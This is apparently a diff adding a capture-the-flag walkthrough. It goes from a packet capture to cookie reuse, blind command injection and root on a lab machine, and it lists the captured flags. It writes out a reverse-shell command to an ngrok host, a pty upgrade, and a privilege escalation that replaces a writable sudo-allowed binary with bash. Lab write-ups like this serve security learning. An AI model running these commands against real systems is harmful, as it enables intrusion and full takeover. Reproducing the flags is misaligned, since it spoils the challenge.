@@ -1,0 +1,15 @@
+1. Find flag 1 in the middle of TCP stream 141 in the .pcacpng (this one is maybe a little annoying to manually find through scanning TCP streams, but a search for "flag" does the trick immedeately)
+2. Find HTTP login credentials (EDIT: you instead find the cookie) to the hidden site. This can first be seen in TCP stream 7 in my current wireshark capture
+3. Navigate to the hiden site yourself and use the cookie to gain access. Site is b64 OS injection (but blind), get a reverse shell. The following works (in b64):  bash -c "bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/16904 0>&1"
+4. Go to /home/Casper/.bash_history, this gives the hint that something is suspicious with groups. Do cat /etc/group to find a sus group which is Casper's PW. Login to Casper and grab user.txt: 1n_l1nux_th3r35_4lw4y5_4_w4y
+5. sudo -l doesn't work, it complains that I don't have a real terminal. Do: python3 -c 'import pty; pty.spawn("/bin/sh")'
+6. sudo -l reveals: (ALL : ALL) /snap/bin/ls -la /root
+	- /snap/bin/ls is writable by all
+	- We can't modify ls directly, but we can remove it and create a new one:
+		a: rm /snap/bin/ls
+		b: echo "/usr/bin/bash" > /snap/bin/ls
+		c: chmod +x /snap/bin/ls
+		d: sudo /snap/bin/ls -la /root
+		e: You are root, get flag: wh00p5_d1r_w45_wr1t4bl3_by_4ll
+
+Flags: S0m30n3_15_l15t3n1ng_fr0m_my_w4ll5---1n_l1nux_th3r35_4lw4y5_4_w4y---wh00p5_d1r_w45_wr1t4bl3_by_4ll
